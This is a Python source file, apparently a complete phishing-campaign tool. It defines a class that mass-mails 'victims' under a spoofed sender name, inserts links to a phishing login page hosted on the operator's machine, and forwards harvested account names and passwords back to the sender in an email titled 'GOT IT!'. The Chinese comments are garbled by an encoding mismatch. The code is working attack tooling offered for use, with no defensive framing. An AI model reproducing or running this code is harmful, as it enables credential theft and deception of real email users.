# -*- coding: gbk -*-
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket

#�����͵����ʼ�
class PhishEmail:
    __SENDER_REQUIRED_KEY = ['Host', 'Port', 'Email', 'Password']
    __sender = {}
    __sender_is_initialized = False

    __victims = []
    __victims_is_initialized = False

    __CONTENT_REQUIRED_KEY = ['Content Type', 'Disguised Name', 'Subject']
    __content = []
    __content_is_initialized = False

    def __init__(self, sender_data = None, victims_data = None, content_data = None):
        '''
        ���캯�������÷��ͷ����ܺ��ߺ��������ݡ�
        '''
        if sender_data is not None:
            self.set_sender(sender_data)
        if victims_data is not None:
            self.set_victims(victims_data)
        if content_data is not None:
            self.set_content(content_data)

    def set_sender(self, data):
        '''
        ���÷��ͷ����ݡ�

        ������
        data (dict): ���ͷ�����
        '''
        if isinstance(data, dict) and all(key in self.__SENDER_REQUIRED_KEY for key in data):
            self.__sender = data
            self.__sender_is_initialized = True
        else: print('Set sender failed.')

    def set_victims(self, _data):
        '''
        �����ܺ������ݡ�

        ������
        data (list): �ܺ�������
        '''
        if isinstance(_data, list) and len(_data) > 0:
            self.__victims = _data
            self.__victims_is_initialized = True
        else: print('Set victim failed.')

    def set_content(self, _data):
        '''
        �����������ݡ�

        ������
        data (dict): ��������
        '''
        if isinstance(_data, dict) and all(key in _data for key in self.__CONTENT_REQUIRED_KEY):
            self.__content = _data
            self.__content_is_initialized = True
        else: print('Set content failed.')

    def send(self, victim_number = -1):
        '''
        ���ܺ������䷢�͵����ʼ���

        ������
        victim_number (int): �ܺ���������Ĭ��Ϊ-1����ʾȫ���ܺ��ߣ������ʾ���͵��ܺ��������������ܺ������ݵ�ǰvictim_number�����䷢���ʼ�

        ���أ�
        list: ���ͳɹ����ܺ��������б�����ʧ���򷵻�None
        '''
        if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
            return_list = [self.__sender['Email']]
            victim_number = len(self.__victims) if victim_number < 0 or victim_number >= len(self.__victims) else victim_number

            for victim_index in range(victim_number):
                server = self.__connect_server()
                if server is not None:
                    message = self.__create_message(self.__victims[victim_index])
                    is_success = self.__send_message(self.__victims[victim_index], message, server)
                    if is_success:
                        return_list.append(self.__victims[victim_index])
                        self.__update_progress(victim_index, victim_number)
                    else:
                        print(f'Send phish email to {self.__victims[victim_index]} failed. Send message failed.')
                    server.quit()
                else:
                    print(f'Send phish email to {self.__victims[victim_index]} failed. Server connect failed.')
            return return_list

        else:
            if not self.__sender_is_initialized:
                print('Send phish email failed. Sender is not initialized')
            elif not self.__victims_is_initialized:
                print('Send phish email failed. Victims is not initialized')
            elif not self.__content_is_initialized:
                print('Send phish email failed. Content is not initialized')
            return None

    def send_reply(self, account, password):
        '''
        �����߷��ͻظ���������ܺ���ͨ�������ʼ����������վ�������������˻����룬�����������䷢�ͱ���Ϊ��GOT IT!�����ʼ����ʼ��ڰ����������˻����룬����ɹ���

        ������
        account (str): ����������˺�
        password (str): �������������
        '''
        if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
            server = self.__connect_server()
            if (server is not None):
                message = MIMEMultipart()
                message['From'] = self.__sender['Email']
                message['To'] = self.__sender['Email']
                message['Subject'] = 'GOT IT!'
                text = f'Account: {account}\nPassword: {password}'
                message.attach(MIMEText(text, 'plain'))
                is_success = self.__send_message(self.__sender['Email'], message, server)
                if not is_success: print('Send reply failed. Send message failed.')
            else: print('Send reply failed. Server connect failed.')
        else:
            if not self.__sender_is_initialized:
                print('Send phish email failed. Sender is not initialized')
            elif not self.__victims_is_initialized:
                print('Send phish email failed. Victims is not initialized')
            elif not self.__content_is_initialized:
                print('Send phish email failed. Content is not initialized')


    def __connect_server(self):
        '''
        �����ʼ���������

        ���أ�
        server (SMTP_SSL): ���ӳɹ����ط��������󣬷��򷵻�None��
        '''
        try:
            server = smtplib.SMTP_SSL(self.__sender['Host'], self.__sender['Port'])
            server.login(self.__sender['Email'], self.__sender['Password'])
            return server
        except Exception as exception:
            print(f'Connect server failed.\n{exception}')
            return None

    def __create_message(self, victim):
        '''
        �����ʼ��������������ݴ�����ͬ���͵��ʼ���

        ������
        victim (str): �ܺ�������

        ���أ�
        message (MIMEMultipart): �ʼ�������ʧ���򷵻ؿ�
        '''
        try:
            message = MIMEMultipart()
            message['From'] = f"{self.__content['Disguised Name']} <{self.__sender['Email']}>"  #αװ�����ߵ�����
            message['To'] = victim
            message['Subject'] = self.__content['Subject']

            if self.__content['Content Type'] == 'Only Text':   #����Ǵ��ı���ֱ������ı�
                text = self.__content['Text']
                message.attach(MIMEText(text, 'plain'))
            elif self.__content['Content Type'] == 'URL':       #�����URL�����ı��е�\t�滻Ϊ������վ����
                ip = self.__get_ip()
                text = self.__content['Text'].replace('\t', f"<a href='http://{ip}:5000/login' style='color:blue'>{self.__content['URL Text']}</a>").replace('\n', '<br>')
                message.attach(MIMEText(text, 'html'))
            elif self.__content['Content Type'] == 'HTML':      #�����HTML����ȡHTML�ļ����ݣ���PHISH WEBSITE�滻Ϊ������վ����
                filepath = os.path.join('.', 'templates', self.__content['HTML Name'])
                with open(filepath, 'r', encoding='utf-8') as file:
                    content = file.read()
                ip = self.__get_ip()
                content = content.replace('PHISH WEBSITE', f'http://{ip}:5000/login')
                message.attach(MIMEText(content, 'html'))
            else:
                print('Create MIME failed. Invalid Content Type.')
                message = None
            return message
        except Exception as exception:
            print(f'Create MIME failed.\n{exception}')
            return None

    def __send_message(self, target, message, server):
        '''
        �����ʼ���

        ������
        target (str): Ŀ������
        message (MIMEMultipart): �ʼ�
        server (SMTP_SSL): ������

        ���أ�
        bool: ���ͳɹ�����True�����򷵻�False
        '''
        try:
            server.sendmail(self.__sender['Email'], target, message.as_string())
            return True
        except Exception as exception:
            print(f'Send message failed.\n{exception}')
            return False

    def __update_progress(self, current, maximum):
        '''
        �ڿ���̨��ʾ�����½�������

        ������
        current (int): ��ǰ����
        maximum (int): ������
        '''
        current = current + 1
        progress = current / maximum
        bar_length = 40
        blocked_bar = int(round(bar_length * progress))
        full_bar = "#" * blocked_bar + "-" * (bar_length - blocked_bar)
        print(f"\r[{full_bar}] {current}/{maximum}", end='')
        if current == maximum: print('\n')

    def __get_ip(self):
        '''
        ��ȡ����ip��

        ���أ�
        str: ����ip����ȡʧ���򷵻�None��
        '''
        ip = None
        hostname = socket.gethostname()
        all_address_info = socket.getaddrinfo(hostname, None)

        #*********************************************************************************************************************
        #���������һ���ܻ�ȡ����ȷ�ı���IP��ַ�������ȡ��IP��ַ������Ҫ�ֶ��޸��������
        #ȡ��ע�ͣ�ֱ�ӷ�����ȷ��IP��ַ�ַ���
        #This method may not get the correct local IP address, if you get the wrong IP address, you need to manually modify this function
        #Uncomment and return the correct IP address string
        #ip = '192.168.1.7'
        #*********************************************************************************************************************

        if ip is not None:
            #��ȡ��������ipv4��ַ
            ip_list = []
            for address_info in all_address_info:
                address = address_info[4][0]
                if ':' not in address:
                    ip_list.append(address)

            #�������ܴ��ڶ��ipv4��ַ��ѡ����С��ַ
            if len(ip_list) != 0:
                ip_list.sort(key=lambda ip: (int(ip.split('.')[2]), int(ip.split('.')[3])))
                ip = ip_list[0]
            else:
                print('Get ip failed.')
        print(f"IP: {ip}")
        return ip